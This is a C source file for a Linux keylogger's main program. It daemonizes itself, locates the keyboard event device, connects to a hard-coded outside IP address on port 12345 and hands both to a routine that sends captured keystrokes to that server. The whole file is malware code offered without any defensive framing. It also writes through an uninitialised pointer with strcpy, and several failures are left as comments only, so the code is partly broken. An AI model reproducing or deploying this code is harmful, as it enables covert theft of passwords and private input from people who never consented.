/**Developed by Fabio Cinicolo **/

#include <stdlib.h>
#include <string.h>
#include "daemon.h"
#include "keylogger.h"
#include "io-networking.h"

int main(int argc, char **argv)
{
    int keyboard, server;
    short port;
    char *ip;

    strcpy(ip, "20.126.123.213");
    port = 12345;

    if (daemonize() < 0)
    {
        // LOG THAT COULDNT START DAEMON
        exit(EXIT_FAILURE);
    }

    if ((keyboard = findKeyboardEventFile()) < 0)
    {
        // LOG THAT COULDNT FIND FILE THAT BEHAVES LIKE A KEYBOARD
    }
    if ((server = openConnectionWithServer(ip, port)) < 0)
    {
        // LOG THAT COULDNT CONNECT WITH SERVER
    }

    startKeylogger(keyboard, server);

    // LOG THAT DAEMON IS CLOSED UPON SERVER HAVING CLOSED CONNECTION
    close(keyboard);
    close(server);
    exit(EXIT_SUCCESS);
}